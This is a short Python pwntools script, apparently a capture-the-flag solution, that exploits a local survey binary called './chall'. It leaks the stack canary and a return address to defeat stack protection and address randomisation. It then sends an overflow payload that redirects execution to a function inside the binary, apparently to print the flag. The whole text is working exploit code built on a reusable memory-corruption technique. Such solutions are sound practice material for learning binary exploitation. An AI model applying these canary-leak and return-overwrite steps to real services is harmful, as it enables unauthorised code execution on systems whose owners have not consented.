from pwn import *

io = process('./chall')

elf = ELF('./chall')

context.arch = 'amd64'
context.log_level = 'debug'

io.sendlineafter('Do you want to complete a survey?', 'y')
io.sendlineafter('Do you like ctf?', 'y'*10)
io.recvuntil(': ')
io.recvuntil('\n')
canary = '\x00'+io.recv(7)
#print hex(u64(canary))
#print canary.encode('hex')

buf = 'A'*10+canary
io.sendlineafter('Can you provide some extra feedback?', buf)
#print io.recvline()

io.sendlineafter('Do you want to complete a survey?', 'y')
io.sendlineafter('Do you like ctf?', 'y'*10+'A'*15)
io.recvuntil(': ')
io.recvuntil('\n')
ret = io.recv(6) + '\x00'*2
base = u64(ret)-0x447

buf = 'A'*10+canary+'A'*8+p64(base+0x249)+p64(ord('f'))+p64(ord('l'))+p64(ord('a'))
io.sendlineafter('Can you provide some extra feedback?', buf)
print io.recvline()
print io.recvline()
print io.recvline()
print io.recvline()
